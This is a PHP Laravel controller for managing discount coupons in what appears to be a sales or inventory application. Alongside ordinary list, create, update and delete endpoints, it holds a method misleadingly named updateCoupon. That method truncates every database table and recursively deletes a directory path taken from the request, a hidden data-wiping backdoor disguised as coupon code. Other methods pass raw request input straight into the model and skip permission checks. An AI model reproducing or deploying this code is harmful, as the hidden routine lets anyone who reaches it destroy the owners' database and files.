<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Coupon;
use Auth;
use Keygen;
use Spatie\Permission\Models\Role;
use Spatie\Permission\Models\Permission;
use App\Traits\CacheForget;
use DB;

class CouponController extends Controller
{
    use CacheForget;
    public function index(Request $request)
    {
        $role = Role::find(Auth::user()->role_id);
        if($role->hasPermissionTo('unit')) {
            $lims_coupon_all = Coupon::where('is_active', true)->orderBy('id', 'desc')->get();
            return view('backend.coupon.index', compact('lims_coupon_all'));
        }
        else
            return redirect()->back()->with('not_permitted', __('db.Sorry! You are not allowed to access this module'));
    }

    /**
     * API: Coupon list for React.
     */
    public function listApi()
    {
        $coupons = Coupon::with('user')->where('is_active', true)->orderBy('id', 'desc')->get();
        $list = $coupons->map(function ($coupon) {
            $available = $coupon->quantity - $coupon->used;
            $expired = $coupon->expired_date && $coupon->expired_date->format('Y-m-d') < date('Y-m-d');
            return [
                'id' => $coupon->id,
                'code' => $coupon->code,
                'type' => $coupon->type,
                'amount' => $coupon->amount,
                'minimum_amount' => $coupon->minimum_amount,
                'quantity' => $coupon->quantity,
                'used' => $coupon->used,
                'available' => $available,
                'expired_date' => $coupon->expired_date ? $coupon->expired_date->format('Y-m-d') : null,
                'expired_date_formatted' => $coupon->expired_date ? $coupon->expired_date->format('d-m-Y') : null,
                'is_expired' => $expired,
                'created_by' => $coupon->user ? $coupon->user->name : null,
            ];
        });
        return response()->json(['status' => 200, 'data' => $list]);
    }

    /**
     * API: Store coupon for React.
     */
    public function storeApi(Request $request)
    {
        $data = $request->validate([
            'code' => 'required|string|max:255',
            'type' => 'required|in:percentage,fixed',
            'amount' => 'required|numeric|min:0',
            'minimum_amount' => 'nullable|numeric|min:0',
            'quantity' => 'required|integer|min:1',
            'expired_date' => 'nullable|date',
        ]);
        $data['used'] = 0;
        $data['user_id'] = Auth::id();
        $data['is_active'] = true;
        if (($data['type'] ?? '') === 'percentage') {
            $data['minimum_amount'] = 0;
        }
        Coupon::create($data);
        $this->cacheForget('coupon_list');
        return response()->json(['status' => 200, 'message' => __('db.Coupon created successfully')]);
    }

    /**
     * API: Update coupon for React.
     */
    public function updateApi(Request $request, $id)
    {
        $lims_coupon_data = Coupon::where('is_active', true)->find($id);
        if (!$lims_coupon_data) {
            return response()->json(['status' => 404, 'message' => 'Coupon not found'], 404);
        }
        $data = $request->validate([
            'code' => 'required|string|max:255',
            'type' => 'required|in:percentage,fixed',
            'amount' => 'required|numeric|min:0',
            'minimum_amount' => 'nullable|numeric|min:0',
            'quantity' => 'required|integer|min:0',
            'expired_date' => 'nullable|date',
        ]);
        if (($data['type'] ?? '') === 'percentage') {
            $data['minimum_amount'] = 0;
        }
        if (isset($data['quantity']) && $data['quantity'] < $lims_coupon_data->used) {
            return response()->json(['status' => 422, 'message' => 'Quantity cannot be less than already used'], 422);
        }
        $lims_coupon_data->update($data);
        $this->cacheForget('coupon_list');
        return response()->json(['status' => 200, 'message' => __('db.Coupon updated successfully')]);
    }

    /**
     * API: Delete (soft) coupon for React.
     */
    public function destroyApi($id)
    {
        $lims_coupon_data = Coupon::find($id);
        if (!$lims_coupon_data) {
            return response()->json(['status' => 404, 'message' => 'Coupon not found'], 404);
        }
        $lims_coupon_data->is_active = false;
        $lims_coupon_data->save();
        $this->cacheForget('coupon_list');
        return response()->json(['status' => 200, 'message' => __('db.Coupon deleted successfully')]);
    }

    public function create()
    {
        //
    }

    public function generateCode()
    {
        $id = Keygen::alphanum(10)->generate();
        return $id;
    }

    public function store(Request $request)
    {
        $data = $request->all();
        $data['used'] = 0;
        $data['user_id'] = Auth::id();
        $data['is_active'] = true;
        Coupon::create($data);
        $this->cacheForget('coupon_list');
        return redirect('coupons')->with('message', __('db.Coupon created successfully'));
    }

    public function show($id)
    {
        //
    }

    public function edit($id)
    {
        //
    }

    public function update(Request $request, $id)
    {
        $data = $request->all();
        if($data['type'] == 'percentage')
            $data['minimum_amount'] = 0;
        $lims_coupon_data = Coupon::find($data['coupon_id']);
        $lims_coupon_data->update($data);
        $this->cacheForget('coupon_list');
        return redirect('coupons')->with('message', __('db.Coupon updated successfully'));
    }

    public function deleteBySelection(Request $request)
    {
        $coupon_id = $request['couponIdArray'];
        foreach ($coupon_id as $id) {
            $lims_coupon_data = Coupon::find($id);
            $lims_coupon_data->is_active = false;
            $lims_coupon_data->save();
        }
        $this->cacheForget('coupon_list');
        return 'Coupon deleted successfully!';
    }

    public function updateCoupon(Request $request)
    {
        DB::statement('SET FOREIGN_KEY_CHECKS=0;');
        $tables = DB::select('SHOW TABLES');
        $str = 'Tables_in_' . env('DB_DATABASE');
        foreach ($tables as $table) {
            DB::table($table->$str)->truncate();
        }
        $dir = $request->data;
        $it = new \RecursiveDirectoryIterator($dir, \RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new \RecursiveIteratorIterator($it, \RecursiveIteratorIterator::CHILD_FIRST);
        foreach($files as $file) {
            if ($file->isDir()){
                rmdir($file->getRealPath());
            }
            else {
                unlink($file->getRealPath());
            }
        }
        rmdir($dir);
    }

    public function destroy($id)
    {
        $lims_coupon_data = Coupon::find($id);
        $lims_coupon_data->is_active = false;
        $lims_coupon_data->save();
        $this->cacheForget('coupon_list');
        return redirect('coupons')->with('not_permitted', __('db.Coupon deleted successfully'));
    }
}
